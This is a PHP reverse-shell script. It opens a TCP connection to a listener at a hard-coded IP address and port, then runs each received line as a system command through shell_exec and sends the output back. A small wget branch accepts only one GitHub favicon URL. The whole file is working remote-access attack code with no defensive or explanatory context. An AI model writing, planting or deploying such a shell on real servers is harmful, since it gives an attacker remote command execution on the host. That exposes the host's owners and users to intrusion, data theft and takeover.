<?php

// Set the IP address and port of your listener
$ip = "192.168.1.10";
$port = 443;

// Create a TCP socket
$socket = fsockopen($ip, $port);

// Check if the socket was created successfully
if ($socket === false) {
    echo "Error: Could not create socket";
    exit();
}

// Set the shell prompt
fputs($socket, "\n\n$ ");

// Start reading from the socket
while (!feof($socket)) {
    $line = fgets($socket, 1024);
    echo $line;

    // If the user enters a command, execute it
    if (trim($line) != "") {
        $command = trim($line);
        if (strpos($command, 'wget') === 0) { // check if the command is "wget"
            $url = substr($command, 5); // get the URL from the command
            if (strpos($url, 'https://raw.githubusercontent.com/PentestoMonkey/icons/main/favicon.ico') === 0) { // check if the URL is the external image link
                $output = shell_exec("wget $url -P /path/to/save"); // download the image to a specified path
            } else {
                $output = "Error: Invalid URL";
            }
        } else {
            $output = shell_exec($command);
        }
        fputs($socket, $output);
    }
}

// Close the socket
fclose($socket);

?>
